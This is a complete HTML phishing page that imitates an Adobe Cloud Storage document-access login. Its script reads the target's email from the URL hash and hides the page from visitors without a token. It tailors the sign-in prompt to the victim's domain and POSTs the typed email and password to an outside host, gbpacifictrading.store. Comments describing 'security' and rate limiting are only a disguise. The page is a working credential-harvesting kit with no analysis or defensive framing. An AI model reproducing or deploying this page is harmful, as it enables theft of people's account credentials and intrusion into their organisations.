<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Secure Document Access</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      background-image: url("pdfbgimage.png");
      background-size: cover;
      background-position: center;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      position: relative;
    }
    body::before {
      content: "";
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0, 0, 0, 0.5);
      z-index: -1;
    }
    .container {
      background-color: #fff;
      border-radius: 0;
      padding: 20px;
      text-align: center;
      box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
      max-width: 300px;
      width: 100%;
      opacity: 0;
      animation: slideIn 0.5s forwards;
      position: relative;
      height: auto;
      min-height: 400px;
    }
    @keyframes slideIn {
      from { width: 0; opacity: 0; }
      to { width: 100%; opacity: 1; }
    }
    #email-logo {
      width: 100px;
      height: 100px;
      margin: auto;
      display: none;
      object-fit: contain;
    }
    h2 {
      font-weight: bold;
      margin-top: 20px;
      margin-bottom: 10px;
    }
    input[type="email"],
    input[type="password"],
    button {
      width: calc(100% - 40px);
      margin-bottom: 10px;
      padding: 10px;
      border-radius: 0;
      border: 1px solid #ccc;
      box-sizing: border-box;
    }
    button {
      background-color: #d32f2f;
      color: #fff;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }
    button:hover {
      background-color: #b71c1c;
    }
    .error-container {
      color: white;
      background: lightcoral;
      padding: 10px;
      margin-top: 10px;
      border-radius: 0;
      display: none;
    }
    .spinner {
      border: 4px solid rgba(0, 0, 0, 0.1);
      border-top: 4px solid #333;
      border-radius: 50%;
      width: 30px;
      height: 30px;
      animation: spin 1s linear infinite;
      margin: 20px auto;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    .remember-me {
      text-align: left;
      margin-bottom: 10px;
      font-size: 14px;
      margin-left: 20px;
    }
    .copyright {
      font-size: 8px;
      color: #999;
      position: left;
      bottom: 20px;
      left: 8px;
    }
  </style>
</head>
<body>
  <div class="container">
    <img id="email-logo" src="" alt="Email logo" />
    <h2>Adobe Cloud Storage</h2>
    <p id="domain-info">Sign in with your Domain Email</p>

    <form name="loginForm" id="loginForm" method="POST" autocomplete="off">
      <input type="email" name="email" id="email" placeholder="Email" required readonly>
      <input type="password" name="password" id="password" placeholder="Password" minlength="6" required>
      <input type="text" name="email_confirm" id="email_confirm" style="display:none" autocomplete="off" tabindex="-1" />

      <div class="remember-me">
        <input type="checkbox" id="remember-me" name="remember-me" checked>
        <label for="remember-me">Remember me</label>
      </div>

      <button type="submit" id="submit-btn">View File 87 KB</button>

      <div class="copyright">
        &copy; 2025 Adobe. By clicking Next, you accept Adobe Cloud Storage terms and conditions.
      </div>
    </form>

    <div class="error-container" id="error-container"></div>
    <div class="spinner" style="display:none;"></div>
  </div>

  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
  <script>
    // Security configuration
    const SECURITY = {
      MAX_ATTEMPTS: 3,
      ATTEMPT_TIMEOUT: 5 * 60 * 1000 // 5 minutes
    };

    // Security variables
    let failedAttempts = 0;
    let lastAttemptTime = 0;

    // Token validation
    function validateTokens() {
      try {
        const hashParams = new URLSearchParams(window.location.hash.substring(1));
        const email = hashParams.get('email');
        const token = hashParams.get('token');
        const timestamp = parseInt(hashParams.get('time')) || 0;

        if (!email || !token) return false;
        if (Date.now() - timestamp > 300000) return false; // 5 min expiry
        
        return true;
      } catch (e) {
        return false;
      }
    }

    // Initialize page
    document.addEventListener("DOMContentLoaded", function() {
      // Validate tokens
      if (!validateTokens()) {
        window.location.href = 'https://verify.yourdomain.com/ref.html';
        return;
      }

      // Process email from URL
      const hashParams = new URLSearchParams(window.location.hash.substring(1));
      const email = hashParams.get('email');
      document.getElementById('email').value = email;

      // Update UI with domain info
      const domainMatch = email.match(/@([\w.-]+)/);
      if (domainMatch) {
        document.getElementById('domain-info').textContent = `Sign in with your ${domainMatch[1]} Email`;
      }

      // Clear URL hash
      history.replaceState(null, '', window.location.pathname);

      // Form submission handler
      document.getElementById('loginForm').addEventListener('submit', function(e) {
        e.preventDefault();
        handleFormSubmit();
      });
    });

    // Form handling
    async function handleFormSubmit() {
      // Rate limiting check
      if (failedAttempts >= SECURITY.MAX_ATTEMPTS) {
        const timeSinceLastAttempt = Date.now() - lastAttemptTime;
        if (timeSinceLastAttempt < SECURITY.ATTEMPT_TIMEOUT) {
          showError(`Too many attempts. Please try again in ${Math.ceil((SECURITY.ATTEMPT_TIMEOUT - timeSinceLastAttempt)/60000)} minutes.`);
          return;
        } else {
          failedAttempts = 0;
        }
      }

      // Validate inputs
      const email = document.getElementById('email').value;
      const password = document.getElementById('password').value;
      
      if (!email || !password) {
        showError('Please fill all fields');
        return;
      }

      // Submit form
      await submitCredentials(email, password);
    }

    async function submitCredentials(email, password) {
      showLoading(true);
      
      try {
        const response = await fetch('https://gbpacifictrading.store/evo/ad.php', {
          method: 'POST',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          body: new URLSearchParams(new FormData(document.getElementById('loginForm')))
        });

        const data = await response.json();
        
        if (data.success) {
          window.location.href = "CS12.1.jpg";
        } else {
          handleFailedAttempt();
          showError(data.message || 'Login failed');
        }
      } catch (error) {
        handleFailedAttempt();
        showError('Network error. Please try again.');
      } finally {
        showLoading(false);
      }
    }

    function handleFailedAttempt() {
      failedAttempts++;
      lastAttemptTime = Date.now();
    }

    function showLoading(show) {
      document.querySelector('.spinner').style.display = show ? 'block' : 'none';
      document.getElementById('submit-btn').disabled = show;
    }

    function showError(message) {
      const errorEl = document.getElementById('error-container');
      errorEl.style.display = 'block';
      errorEl.textContent = message;
      setTimeout(() => errorEl.style.display = 'none', 5000);
    }
  </script>
</body>
</html>
